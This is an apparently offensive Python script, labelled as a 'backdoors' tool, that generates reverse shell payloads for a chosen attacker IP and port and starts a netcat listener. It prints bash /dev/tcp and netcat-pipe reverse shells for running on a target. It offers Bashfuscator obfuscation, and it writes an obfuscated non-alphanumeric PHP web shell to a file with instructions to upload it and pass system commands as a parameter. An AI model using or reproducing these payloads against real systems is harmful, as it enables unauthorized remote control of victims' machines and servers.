#!/usr/bin/python3

#FIXED: make ip address variable to be treated as string

"""
Author: Skiddyfruit
Version: 2.0
License: MIT-3.0
Category: backdoors
"""

"""
Requirements:

Run setup.py

sudo python3 setup.py
"""
import ifaddr # Fetching ip from interface
import os 
import linecache # for reading specific lines
import pathlib



adapters = ifaddr.get_adapters()

for adapter in adapters:
    print("IPs of network adapter " + adapter.nice_name)
    for ip in adapter.ips:
        print(ip.ip, "\n")

ip = str(input("HOST IP:\n"))
port = str(input("PORT:\n"))
#shell = str(input("Please select an option?\n"))
def full():
    print("Welcome, let us generate a choosen reverse shell\n")
    global ip
    global port
    
    print("please select language and shell option:\n\n [1] - python (Alphanumeric reverse shell)\n\n [2] - PHP(Alphanumeric reverse shell)\n\n [3] - Bash(Reverse shell)\n\n [4] - Netcat(Reverse shell) \n\n\nAdvanced:\n\n [5] - Bash(obfuscated bash reverse shell)\n\n [6] - PHP(Non-Alphanumreric php shell)")
    
    selection = input("Type in a choosen number:\t\n")
    
    if int(selection) == 1:
        with open("myshells.txt", "r") as shells:
            #for myreplace in (("[ip]", ip), ("[port]", port)):
            fetchshell = linecache.getline('myshells.txt', 1)
            ipreplaced = fetchshell.replace("[ip]", '"{}"').format(ip)
            #print(ipreplaced.replace("[port]", '"{}"')).format(port)

            print("Run the following payload on target: \n")
            print(ipreplaced.replace("[port]", port), "\n")
            print("Starting Netcat Listener:\n")
            os.system(str("netcat -nvlp {}").format(port))

    elif int(selection) == 2:
        with open("myshells.txt", "r") as shells:
            #for myreplace in (("[ip]", ip), ("[port]", port)):
            fetchshell = linecache.getline('myshells.txt', 2)
            ipreplaced = fetchshell.replace("[ip]", '"{}"').format(ip)
            #print(ipreplaced.replace("[port]", '"{}"')).format(port)

            print("Run the following payload on target: \n")
            print(ipreplaced.replace("[port]", port), "\n")
            print("starting Listener:\n")
            os.system(str("netcat -nvlp {}").format(port))

    elif int(selection) == 3:
            with open("myshells.txt", "r") as shells:
                #for myreplace in (("[ip]", ip), ("[port]", port)):
                fetchshell = linecache.getline('myshells.txt', 3)
                ipreplaced = fetchshell.replace("[ip]", ip)
                #print(ipreplaced.replace("[port]", '"{}"')).format(port)
                            
                print("Run the following payload on target: \n")
                print(ipreplaced.replace("[port]", port), "\n")
                print("starting Netcat Listener:\n")
                os.system(str("netcat -nvlp {}").format(port))
    elif int(selection) == 4:
            with open("myshells.txt", "r") as shells:
                #for myreplace in (("[ip]", ip), ("[port]", port)):
                fetchshell = linecache.getline('myshells.txt', 4)
                ipreplaced = fetchshell.replace("[ip]", ip)
                #print(ipreplaced.replace("[port]", '"{}"')).format(port)
                        
                print("Run the following payload on target: \n")

                print("mkfifo pipe && nc {} {} <pipe | /bin/bash &>pipe".format(ip, port), "\n")

                print("or\n")

                print("bash -i >& /dev/tcp/{}/{} 0>&1".format(ip, port), "\n")

                print("starting Listener:\n")

                os.system(str("netcat -nvlp {}").format(port))
              

    elif int(selection) == 5:
               
                #if os.path.exists("~/Bashfuscator"):
                #    finalpayload = os.system("./bashfuscator -c 'bash -i >& /dev/tcp/{}/{} 0>&1'").format(str((ip, port)))
                #    print(finalpayload, end=" ")
                #print("./bashfuscator -c 'bash -i >& /dev/tcp/{}/{} 0>&1'".format(ip, port))
                #else:
                    #os.system("cd ~")
                    #os.system("git clone https://github.com/Bashfuscator/Bashfuscator;cd Bashfuscator;python3 setup.py install --user;cd /bashfuscator/bin")
                    finalpayload = os.system("bashfuscator -c 'bash -i >& /dev/tcp/{}/{} 0>&1'").format(str((ip, port)))
                    print(finalpayload, end=" ")
                    os.system(str("netcat -nvlp {}").format(port))
    elif int(selection) == 6:
        parameter = "?0=system &1=uname  %20-a'"
        
        name = str(input("Name of file to output payload to: "))
        
        payload = str("@$_[]=@!+_; $__=@${_}>>$_;$_[]=$__;$_[]=@_;$_[((++$__)+($__++ ))].=$_;\n $_[]=++$__; $_[]=$_[--$__][$__>>$__];$_[$__].=(($__+$__)+ $_[$__-$__]).($__+$__+$__)+$_[$__-$__];\n $_[$__+$__] =($_[$__][$__>>$__]).($_[$__][$__]^$_[$__][($__<<$__)-$__] );\n $_[$__+$__] .=($_[$__][($__<<$__)-($__/$__)])^($_[$__][$__] );\n $_[$__+$__] .=($_[$__][$__+$__])^$_[$__][($__<<$__)-$__ ];\n$_=$\n $_[$__+ $__] ;$_[@-_]($_[@!+_] ) ;")
        
        with open(name, "w+") as backdoor:
          backdoor.write(payload)
          path = pathlib.Path().parent.absolute()
          print("File written to: {}/{} \n".format(path, name)) 
          print("example USAGE: Upload {} and use the following parameter for command execution: {}  ".format(name, parameter)) 
        
full()


